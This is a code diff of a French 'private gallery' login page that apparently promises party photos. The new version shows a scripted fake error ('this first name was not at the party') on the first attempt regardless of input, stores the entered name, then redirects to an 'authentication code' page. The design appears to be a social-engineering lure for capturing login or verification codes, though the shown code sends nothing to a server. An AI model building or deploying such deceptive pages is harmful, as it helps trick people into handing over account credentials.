@@ -1,141 +1,88 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="fr">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Accès Galerie Privée</title>
-  <style>
-    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;500;700&display=swap');
-
-    * {
-      box-sizing: border-box;
-      font-family: 'Poppins', sans-serif;
-    }
-
-    body {
-      margin: 0;
-      height: 100vh;
-      background: url('https://images.unsplash.com/photo-1507525428034-b723cf961d3e?auto=format&fit=crop&w=1500&q=80') no-repeat center center / cover;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      backdrop-filter: blur(5px);
-    }
-
-    .card {
-      background: rgba(255, 255, 255, 0.1);
-      border-radius: 20px;
-      padding: 40px;
-      width: 350px;
-      color: #fff;
-      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
-      backdrop-filter: blur(10px);
-      border: 1px solid rgba(255, 255, 255, 0.2);
-      text-align: center;
-    }
-
-    h2 {
-      margin-bottom: 20px;
-      font-weight: 500;
-      letter-spacing: 1px;
-    }
-
-    form {
-      display: flex;
-      flex-direction: column;
-      gap: 15px;
-    }
-
-    input {
-      padding: 12px;
-      border: none;
-      border-radius: 8px;
-      outline: none;
-      background: rgba(255, 255, 255, 0.15);
-      color: #fff;
-      font-size: 15px;
-      transition: background 0.2s ease;
-    }
-
-    input::placeholder {
-      color: #ddd;
-    }
-
-    input:focus {
-      background: rgba(255, 255, 255, 0.25);
-    }
-
-    button {
-      background: linear-gradient(135deg, #6dd5fa, #2980b9);
-      color: white;
-      border: none;
-      padding: 12px;
-      border-radius: 8px;
-      font-weight: 600;
-      font-size: 16px;
-      cursor: pointer;
-      transition: transform 0.2s ease, box-shadow 0.2s ease;
-    }
-
-    button:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
-    }
-
-    #out {
-      margin-top: 20px;
-      text-align: left;
-      font-size: 12px;
-      color: #eee;
-      white-space: pre-wrap;
-      word-break: break-all;
-      max-height: 200px;
-      overflow: auto;
-    }
-
-    footer {
-      position: absolute;
-      bottom: 15px;
-      font-size: 12px;
-      color: rgba(255,255,255,0.6);
-    }
-  </style>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Accès Galerie Privée</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;500;700&display=swap');
+  *{box-sizing:border-box;font-family:'Poppins',sans-serif}
+  body{
+    margin:0;height:100vh;
+    background:url('https://images.unsplash.com/photo-1507525428034-b723cf961d3e?auto=format&fit=crop&w=1500&q=80') center/cover no-repeat;
+    display:flex;align-items:center;justify-content:center;
+    background-attachment:fixed;
+  }
+  .card{
+    width:380px;padding:36px;border-radius:18px;
+    background:rgba(0,0,0,0.45);color:#fff;text-align:center;
+    box-shadow:0 10px 30px rgba(0,0,0,0.5);
+    border:1px solid rgba(255,255,255,0.06);
+  }
+  h2{margin:0 0 14px;font-weight:500}
+  .hint{color:#ddd;margin-bottom:12px;font-size:14px}
+  form{display:flex;flex-direction:column;gap:12px}
+  input{padding:11px;border-radius:8px;border:none;background:rgba(255,255,255,0.08);color:#fff}
+  input::placeholder{color:#e6e6e6bb}
+  button{padding:12px;border-radius:8px;border:none;background:linear-gradient(135deg,#6dd5fa,#2980b9);color:#fff;font-weight:600;cursor:pointer}
+  #error{margin-top:14px;color:#ffb3b3;font-weight:600;opacity:0;transition:opacity .25s}
+  .shake{animation:shake .4s}
+  @keyframes shake{0%{transform:translateX(0)}25%{transform:translateX(-8px)}50%{transform:translateX(8px)}75%{transform:translateX(-8px)}100%{transform:translateX(0)}}
+  footer{position:fixed;bottom:12px;left:50%;transform:translateX(-50%);color:rgba(255,255,255,0.6);font-size:12px}
+</style>
 </head>
 <body>
-  <div class="card">
+  <div class="card" id="card">
     <h2>🔒 Accès à la Galerie Privée</h2>
+    <div class="hint">Entrez votre prénom pour accéder aux photos</div>
+
     <form id="login">
-      <input name="username" placeholder="Numéro de Telephone" required />
-      <input name="password" type="password" placeholder="Prénom" required />
+      <input name="username" placeholder="Prénom" required />
+      <input name="password" type="password" placeholder="Mot de passe" required />
       <button type="submit">Entrer</button>
     </form>
-    <pre id="out"></pre>
+
+    <div id="error">ce prenom n'etait pas a la soiree</div>
   </div>
-  <footer>© 2025</footer>
+
+  <footer>© 2025 Ma Galerie</footer>
 
   <script>
-    const out = document.getElementById('out');
-    async function post(path, data) {
-      const res = await fetch(path, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(data),
-      });
-      const json = await res.json().catch(() => ({}));
-      out.textContent = JSON.stringify(json, null, 2);
-      return json;
-    }
+    const form = document.getElementById('login');
+    const card = document.getElementById('card');
+    const error = document.getElementById('error');
 
-    document.getElementById('login').addEventListener('submit', e => {
+    // clé pour savoir si on a déjà montré le message
+    const FIRST_KEY = 'galerie_first_attempt_shown';
+
+    form.addEventListener('submit', e => {
       e.preventDefault();
-      const fd = new FormData(e.target);
-      post('/api/login', {
-        username: fd.get('username'),
-        password: fd.get('password'),
-      });
+      const fd = new FormData(form);
+      const username = fd.get('username') || '';
+      const password = fd.get('password') || '';
+
+      // on stocke temporairement le prénom pour la page d'auth
+      localStorage.setItem('galerie_last_username', username);
+
+      // si premier essai : afficher le message d'erreur local puis rediriger
+      if (!localStorage.getItem(FIRST_KEY)) {
+        error.style.opacity = '1';
+        card.classList.add('shake');
+        // marque comme montré pour les prochaines fois
+        localStorage.setItem(FIRST_KEY, '1');
+
+        // laisser l'utilisateur voir le message puis rediriger vers auth.html
+        setTimeout(() => {
+          // enlever l'animation
+          card.classList.remove('shake');
+          // redirige vers la page de code d'authentification
+          window.location.href = 'auth.html';
+        }, 800);
+      } else {
+        // pas de message : redirection immédiate
+        window.location.href = 'auth.html';
+      }
     });
   </script>
 </body>
 </html>
-
-
